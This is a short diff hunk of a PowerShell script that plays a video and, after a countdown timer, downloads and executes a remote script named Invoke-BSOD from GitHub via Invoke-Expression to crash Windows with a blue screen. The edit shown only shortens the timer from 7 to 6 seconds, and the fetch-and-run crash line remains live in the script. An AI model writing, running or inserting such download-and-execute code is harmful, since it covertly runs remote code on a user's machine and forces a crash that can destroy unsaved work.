@@ -34,7 +34,7 @@ $VideoPlayer.Play()
 
 # Timer for countdown
 $Timer = New-Object System.Windows.Threading.DispatcherTimer
-$Timer.Interval = [TimeSpan]::FromSeconds(7)
+$Timer.Interval = [TimeSpan]::FromSeconds(6)
 $Timer.Add_Tick({
     $Timer.Stop()
     Invoke-Expression ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
